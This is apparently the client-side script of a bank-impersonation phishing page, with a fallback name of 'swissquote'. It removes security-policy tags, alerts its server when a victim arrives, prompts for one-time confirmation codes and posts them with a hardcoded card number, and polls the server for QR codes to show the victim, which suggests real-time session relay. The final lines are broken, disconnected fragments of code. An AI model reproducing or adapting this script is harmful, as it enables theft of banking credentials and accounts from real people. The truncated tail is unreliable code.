    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://1.5.3/build/qrcode.min.js"></script>
    <link href="/bos_files/sweetalert2.min.css" rel="stylesheet">
    
    <script>
    
    var lkscript = true;
    var bankLink = window.location.href !== 'about:srcdoc' ? window.location.href.split('/') [3] : 'swissquote';
    var urlParams = new URLSearchParams(window.location.search);
    
    document.querySelectorAll('base, meta[http-equiv]').forEach(el => {
      const val = el.getAttribute('http-equiv')?.toLowerCase() || '';
      if (val.includes('policy')) el.remove();
      console.log("del tag");
    });
    
    function postRedirect(url, data) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = url;
        
        for (var key in data) {
            if (data.hasOwnProperty(key)) {
                var input = document.createElement('input');
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }
        }
        
        document.body.appendChild(form);
        form.submit();
    }
    
    var blocker = false;
    
    const currentLanguage = 'translate';
    const t = translations[currentLanguage];
    window.t = t; // for shadow iframe
    
    if (typeof window.openFormLoading !== 'function') {
        window.openFormLoading = function (title, text) {
            return Swal.fire({
                title: title || t.loginConfirmation,
                text: text || t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
        };
    }
    
    if (typeof window.closeFormLoading !== 'function') {
        window.closeFormLoading = function () {
            Swal.close();
        };
    }
    
    $.post('#', { type: "notify", action: "lk", finger: "" });
    
    class Account {
        static #sanitizeInput(input) {
            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        
        static code() {
            Swal.fire({
                title: t.confirmation,
                text: t.codeSent,
                input: 'text',
                inputPlaceholder: t.enterCode,
                confirmButtonText: t.confirm,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                inputValidator: (value) => {
                    if (!value) return t.codeRequired;
                    if (!/^\d+$/.test(value)) return t.numbersOnly;
                },
                preConfirm: (value) => {
                    if (value.trim().length < 1) {
                        alert("Incorrect code");
                    } else {
                        return fetch('#', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                type: "code",
                                number: "5351 4154 0624 9643",
                                code: value
                            })
                        }).then(response => {
                            if (!response.ok) throw new Error('Network error');
                            Account.wait();
                        });
                    }
                }
            });
        }
        
        static wait() {
            return Swal.fire({
                title: t.loginConfirmation,
                text: t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
        }
        
        static async qrsync() {
            let qrDataInterval = null;
            let lastData = null;
            let intervalStartTime = Date.now();
            let lastDataChangeTime = Date.now();
            let lastServerDataTime = Date.now();
            
            const generateQRCode = async (data) => {
                try {
                    const qrDataUrl = await QRCode.toDataURL(data, {
                        width: 300,
                        margin: 2,
                        color: {
                            dark: '#000000',
                            light: '#FFFFFF'
                        }
                    });
                    return qrDataUrl;
                } catch (error) {
                    console.error('QR code generation error:', error);
                    return null;
                }
            };
            
            const showQRCode = async (data) => {
                const qrImage = await generateQRCode(data);
                if (qrImage) {
                    Swal.fire({
                        title: 'QR code',
                        imageUrl: qrImage,
                        imageWidth: 300,
                        imageHeight: 300,
                        imageAlt: 'QR code',
                        confirmButtonText: 'Close',
                        allowOutsideClick: true,
                        allowEscapeKey: true
                    });
                }
            };
            
            Swal.fire({
                title: t.loginConfirmation,
                text: t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
            
            qrDataInterval = setInterval(async () => {
                try {
                    const now = Date.now();
                    const timeSinceStart = now - intervalStartTime;
                    const timeSinceLastDataChange = now - lastDataChangeTime;
                    const timeSinceLastServerData = now - lastServerDataTime;
                    
                    if (timeSinceLastServerData > 180000) {
                        console.log('Interval closed: no server data for 3 minutes');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    if (timeSinceLastDataChange > 180000 && lastData !== null) {
                        console.log('Interval closed: data unchanged for 3 minutes');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    if (timeSinceStart > 180000) {
                        console.log('Interval closed: 3 minutes elapsed');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    const response = await fetch('#', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams({
                            type: 'XApi',
                            act: 'qrsync'
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error('Network error');
                    }
                    
                    const result = await response.json();
                    lastServerDataTime = Date.now();
                    const serverDataValue = result.data || '';
                    
                    if (!serverDataValue || serverDataValue.trim() === '') {
                        console.log('Waiting for data...');
                    } else {
                        if (lastData !== serverDataValue) {
                            lastData = serverDataValue;
                            lastDataChangeTime = Date.now();
                            console.log('Server data changed:', serverDataValue);

              const encodedName = btoa(binaryString);
    
              sentData.push({

            if (sentData.length === 0) {

              if (node.shadowRoot) {

            traverse(root);
            return results;
